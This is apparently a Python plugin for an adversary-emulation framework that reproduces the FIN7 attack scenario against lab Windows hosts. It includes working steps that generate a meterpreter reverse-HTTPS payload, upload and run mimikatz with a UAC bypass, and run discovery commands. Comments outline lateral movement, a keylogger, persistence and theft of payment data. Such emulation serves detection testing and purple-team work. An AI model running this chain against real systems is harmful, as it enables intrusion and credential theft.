#!/usr/bin/env python3

# Adversary emulation for FIN7

from plugins.base.attack import AttackPlugin
from app.interface_sfx import CommandlineColors
from app.metasploit import MSFVenom, Metasploit
import os


class FIN7Plugin(AttackPlugin):

    # Boilerplate
    name = "fin7_1"
    description = "A plugin simulating the FIN7 adversary"
    ttp = "multiple"
    references = ["https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7/Emulation_Plan/Scenario_1"]

    required_files_attacker = []    # Files shipped with the plugin which are needed by the kali tool. Will be copied to the kali share

    ######
    payload_type_1 = "windows/x64/meterpreter/reverse_https"  # payload for initial stage

    def __init__(self):
        super().__init__()
        self.plugin_path = __file__
        self.metasploit_1 = None

    def get_metasploit_1(self):
        """ Returns a metasploit with a session for the first targeted machine """
        if self.metasploit_1:
            return self.metasploit_1

        self.metasploit_1 = Metasploit(self.metasploit_password, attacker=self.attacker_machine_plugin, username=self.metasploit_user)
        self.metasploit_1.start_exploit_stub_for_external_payload(payload=self.payload_type_1)
        return self.metasploit_1

    def step1(self):
        self.attack_logger.vprint(f"{CommandlineColors.OKBLUE}Step 1 (target hotelmanager): Initial Breach{CommandlineColors.ENDC}", 1)
        # TODOS: No idea if we can replicate that automated as those are manual tasks

        # RTF with VB payload (needs user interaction)
        # playoad executed by mshta
        # mshta build js payload
        # mshta copies wscript.exe to ADB156.exe
        # winword.exe spawns verclsid.exe (a normal tool that can download stuff, no idea yet what it is used for here)
        # mshta uses taskschd.dll to create a task in 5 minutes

        self.attack_logger.vprint(f"{CommandlineColors.OKGREEN}End Step 1: Initial Breach{CommandlineColors.ENDC}", 1)

    def step2(self):
        self.attack_logger.vprint(f"{CommandlineColors.OKBLUE}Step 2 (target hotelmanager): Delayed Malware Execution{CommandlineColors.ENDC}", 1)

        # scheduled task spawns Adb156.exe via svchost https://attack.mitre.org/techniques/T1053/005/
        # Adb156.exe loads scrobj.dll and executes sql-rat.js via jscript https://attack.mitre.org/techniques/T1059/007/
        # Adb156.exe connects via MSSQL to attacker server
        # WMI quieries for network information and system information https://attack.mitre.org/techniques/T1016/ and https://attack.mitre.org/techniques/T1082/ (Caldera ?)

        self.attack_logger.vprint(f"{CommandlineColors.OKGREEN}End Step 2: Delayed Malware Execution{CommandlineColors.ENDC}", 1)

    def step3(self):
        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 3 (target hotelmanager): Target Assessment{CommandlineColors.ENDC}", 1)

        # TODO: Make sure logging is nice and complete

        # WMI queries  https://attack.mitre.org/techniques/T1057/

        # Execute net view from spawned cmd https://attack.mitre.org/techniques/T1135/
        self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}new view {CommandlineColors.ENDC}", 1)
        self.caldera_attack(self.targets[0], "deeac480-5c2a-42b5-90bb-41675ee53c7e", parameters={"remote.host.fqdn": self.targets[0].get_ip()})

        # check for sandbox https://attack.mitre.org/techniques/T1497/
        # The documentation does not define how it is checking exactly.
        self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}get-wmiobject win32_computersystem | fl model{CommandlineColors.ENDC}", 1)
        self.caldera_attack(self.targets[0], "5dc841fd-28ad-40e2-b10e-fb007fe09e81")

        # query username https://attack.mitre.org/techniques/T1033/
        self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}query USERNAME env{CommandlineColors.ENDC}", 1)
        self.caldera_attack(self.targets[0], "c0da588f-79f0-4263-8998-7496b1a40596")

        # TODO: query computername https://attack.mitre.org/techniques/T1082/
        # self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}query COMPUTERNAME env{CommandlineColors.ENDC}", 1)
        # self.caldera_attack(self.targets[0], "c0da588f-79f0-4263-8998-7496b1a40596")

        # TODO: load adsldp.dll and call dllGetClassObject() for the Windows Script Host ADSystemInfo Object COM object https://attack.mitre.org/techniques/T1082/
        # WMI query for System Network Configuration discovery https://attack.mitre.org/techniques/T1016/
        self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}Network configuration discovery. Original is some WMI, here we are using nbstat{CommandlineColors.ENDC}", 1)
        self.caldera_attack(self.targets[0], "14a21534-350f-4d83-9dd7-3c56b93a0c17")
        # System Info discovery https://attack.mitre.org/techniques/T1082/
        self.attack_logger.vprint(
            f"{CommandlineColors.OKCYAN}System info discovery, as close as it gets{CommandlineColors.ENDC}",
            1)
        self.caldera_attack(self.targets[0], "b6b105b9-41dc-490b-bc5c-80d699b82ce8")
        # CMD.exe->powershell.exe, start takeScreenshot.ps1 https://attack.mitre.org/techniques/T1113/
        self.attack_logger.vprint(
            f"{CommandlineColors.OKCYAN}Take screenshot{CommandlineColors.ENDC}",
            1)
        self.caldera_attack(self.targets[0], "316251ed-6a28-4013-812b-ddf5b5b007f8")
        # TODO: Upload that via MSSQL transaction https://attack.mitre.org/techniques/T1041/

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}End Step 3: Target Assessment{CommandlineColors.ENDC}", 1)

    def step4(self):
        """ Create staging payload and inject it into powsershell.exe
        https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7/Resources/Step4/babymetal

        """
        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 4 (target hotelmanager): Staging Interactive Toolkit{CommandlineColors.ENDC}", 1)

        self.attack_logger.vprint(
            f"{CommandlineColors.OKCYAN}Create babymetal replacement{CommandlineColors.ENDC}",
            1)
        # Uploaded stager creates meterpreter shell (babymetal)
        # Generate payload:

        payload_name = "babymetal.exe"

        # TODO: Babymetal payload is a dll. Currently we are using a simplification here (exe). Implement the proper steps. For the proper steps see:
        # Several steps are required https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7/Resources/Step4/babymetal
        # Original: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.4 LPORT=443 EXITFUNC=thread -f C --encrypt xor --encrypt-key m
        # EXITFUNC=thread     : defines cleanup after exploitation. Here only the thread is exited
        # -f C                : output is c code
        # --encrypt xor       : xor encrypt the results
        # --encrypt-key m     : the encryption key
        venom = MSFVenom(self.attacker_machine_plugin, self.targets[0], self.attack_logger)
        venom.generate_and_deploy(payload=self.payload_type_1,
                                  architecture="x64",
                                  platform="windows",
                                  lhost=self.attacker_machine_plugin.get_ip(),
                                  format="exe",
                                  outfile=payload_name)

        self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}Execute babymetal replacement - waiting for meterpreter shell{CommandlineColors.ENDC}", 1)

        # TODO: Add shellcode code into C file, compile

        # TODO. Call convertto_shellcode ps1 ( needs a windows attacker machine or powershell on the attacker !)
        # sudo apt install powershell
        # pwsh
        # result is babymetal.dll

        # TODO: convert to base64

        # TODO: target already runs adb156.exe. This one gets the shellcode and decodes it.
        # TODO: adb156.exe -> cmd.exe ->powershell.exe decodes embedded dll payload https://attack.mitre.org/techniques/T1059/003/ and https://attack.mitre.org/techniques/T1059/001/

        # TODO: powershell cmdlet Invoke-Expression executes decoded dll https://attack.mitre.org/techniques/T1140/
        # TODO: invoke-Shellcode.ps1 loads shellcode into powershell.exe memory (Allocate memory, copy shellcode, start thread)  (received from C2 server) https://attack.mitre.org/techniques/T1573/
        # https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/master/fin7/Resources/Step4/babymetal/Invoke-Shellcode.ps1

        # metasploit1 = self.get_metasploit_1()
        # print("Got session, calling command")
        # print(metasploit.meterpreter_execute_on(["getuid"], self.targets[0]))

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}End Step 4: Staging Interactive Toolkit{CommandlineColors.ENDC}", 1)

    def step5(self):
        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 5 (target hotelmanager): Escalate Privileges{CommandlineColors.ENDC}", 1)

        # This is meterpreter !
        metasploit = self.get_metasploit_1()

        # powershell -> CreateToolHelp32Snapshot() for process discovery (Caldera alternative ?) https://attack.mitre.org/techniques/T1057/
        self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}Execute ps -ax through meterpreter{CommandlineColors.ENDC}", 1)
        print(metasploit.meterpreter_execute_on(["ps -ax"], self.targets[0]))

        # powershell: GetIpNetTable() does ARP entries https://attack.mitre.org/techniques/T1016/
        self.attack_logger.vprint(
            f"{CommandlineColors.OKCYAN}Execute arp through meterpreter{CommandlineColors.ENDC}", 1)
        print(metasploit.meterpreter_execute_on(["arp"], self.targets[0]))
        # powershell: nslookup to query domain controler(hoteldc) for ip from ARP (Caldera ?) https://attack.mitre.org/techniques/T1018/
        # TODO: Add real <itadmin> ip
        itadmin = "127.0.0.1"
        self.attack_logger.vprint(
            f"{CommandlineColors.OKCYAN}Execute nslookup through meterpreter{CommandlineColors.ENDC}", 1)
        print(metasploit.meterpreter_execute_on([f"execute -f nslookup.exe -H -i -a '{itadmin}'"], self.targets[0]))

        # Copy step 5 attack tools to attacker

        # powershell download from C2 server: samcat.exe (mimikatz) https://attack.mitre.org/techniques/T1507/
        # tplayground = self.targets[0].get_playground()
        # aplayground = self.attacker_machine_plugin.get_playground() or ""
        self.attacker_machine_plugin.put(os.path.join(os.path.dirname(self.plugin_path), "resources", "step5", "samcat.exe"), "samcat.exe")
        self.attacker_machine_plugin.put(os.path.join(os.path.dirname(self.plugin_path), "resources", "step5", "uac-samcats.ps1"), "uac-samcats.ps1")
        cmd = "upload samcat.exe 'samcat.exe'  "
        print(cmd)
        self.attack_logger.vprint(
            f"{CommandlineColors.OKCYAN}Uploading mimikatz through meterpreter{CommandlineColors.ENDC}", 1)
        print(metasploit.meterpreter_execute_on([cmd], self.targets[0], delay=2))

        cmd = "upload uac-samcats.ps1 'uac-samcats.ps1'  "
        print(cmd)
        self.attack_logger.vprint(
            f"{CommandlineColors.OKCYAN}Uploading UAC bypass script through meterpreter{CommandlineColors.ENDC}", 1)
        print(metasploit.meterpreter_execute_on([cmd], self.targets[0], delay=2))

        # execute uac-samcats.ps1 This: spawns a powershell from powershell -> samcat.exe as high integrity process https://attack.mitre.org/techniques/T1548/002/
        execute_samcats = "execute -f powershell.exe -H -i -a '-c ./uac-samcats.ps1'"
        print(execute_samcats)
        self.attack_logger.vprint(
            f"{CommandlineColors.OKCYAN}Execute UAC bypass (and mimikatz) through meterpreter{CommandlineColors.ENDC}", 1)
        print(metasploit.meterpreter_execute_on([execute_samcats], self.targets[0], delay=20))
        # TODO: Make it more reliable. Also test which OS versions are working properly. It worked at least once

        # samcat.exe: reads local credentials https://attack.mitre.org/techniques/T1003/001/

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}End Step 5: Escalate Privileges{CommandlineColors.ENDC}", 1)

    def step6(self):
        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 6 (target hotelmanager -> itadmin): Expand Access{CommandlineColors.ENDC}", 1)

        # This is meterpreter !

        # powershell download: paexec.exe and hollow.exe https://attack.mitre.org/techniques/T1105/
        # spawn powershell through cmd
        # !!! admin host!!! use password with paexec to move lateral to it admin host https://attack.mitre.org/techniques/T1021/002/
        # paexec  starts temorary windows service and executes hollow.exe https://attack.mitre.org/techniques/T1021/002/
        # => Lateral move to itadmin
        # hollow.exe spawns svchost and unmaps memory image https://attack.mitre.org/techniques/T1055/012/
        # svchost starts data exchange

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}End Step 6: Expand Access{CommandlineColors.ENDC}", 1)

    def step7(self):
        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 7: Setup User Monitoring{CommandlineColors.ENDC}", 1)

        # This is meterpreter !
        # Emulating DLL hijacking functionality of BOOSTWRITE

        # Create BOOSTWRITE meterpreter handler
        # Create temporary HTTP server serving "B" as XOR Key
        # hollow.exe meterpreter session dowloads BOOSTWRITE.dll to srrstr.dll https://attack.mitre.org/techniques/T1105/
        # cmd.exe spawns svchost.exe -> executes SystemPropertiesAdvanced.exe which executes srrstr.dll
        # srrstr.dll spawns rundll32.exe which communicates to metasploit. New shell !

        # => Adversary gets a new shell

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}End Step 7: Setup User Monitoring{CommandlineColors.ENDC}", 1)

    def step8(self):
        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 8 (target: itadmin as domain_admin): User Monitoring{CommandlineColors.ENDC}", 1)

        # This is meterpreter !

        # Meterpreter migrates to explorer.exe (from svchost) https://attack.mitre.org/techniques/T1055/
        # screenspy for screen capture https://attack.mitre.org/techniques/T1113/
        # migrate session to mstsc.exe https://attack.mitre.org/techniques/T1056/001/
        # deploy keylogger https://attack.mitre.org/techniques/T1056/001/
        # create a RDP session from itadmin -> accounting using stolen credentials

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}End Step 8: User Monitoring{CommandlineColors.ENDC}", 1)

    def step9(self):
        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 9 (target: accounting): Setup Shim Persistence{CommandlineColors.ENDC}", 1)

        # This is meterpreter !

        # powershell.exe executes base64 encoded commands (Caldera ?)
        # Downloads dll329.dll and sdbE376
        # persistence: sdbinst.exe installs sdbE376.tmp for application shimming https://attack.mitre.org/techniques/T1546/011/

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}End Step 9: Setup Shim Persistence{CommandlineColors.ENDC}", 1)

    def step10(self):
        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 10 (target: accounting): Steal Payment Data{CommandlineColors.ENDC}", 1)

        # This is meterpreter !

        # Scenario target is the fake payment application AccountingIQ.exe

        # Machine is rebooted
        # shim dll329.dll is activated https://attack.mitre.org/techniques/T1546/011/
        # AccountingIQ injects into SyncHost.exe, rundll32.exe communicates to C2
        # debug.exe is downloaded from C2, does process discovery https://attack.mitre.org/techniques/T1105/
        # send 7za.exe to target. Zip stolen data, exfiltrate

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}End Step 10: Steal Payment Data{CommandlineColors.ENDC}", 1)

    def run(self, targets):
        """ Run the command

        @param targets: A list of targets
        """

        self.step1()
        self.step2()
        # self.step3()  # Done and works
        self.step4()
        self.step5()
        self.step6()
        self.step7()
        self.step8()
        self.step9()
        self.step10()

        return ""
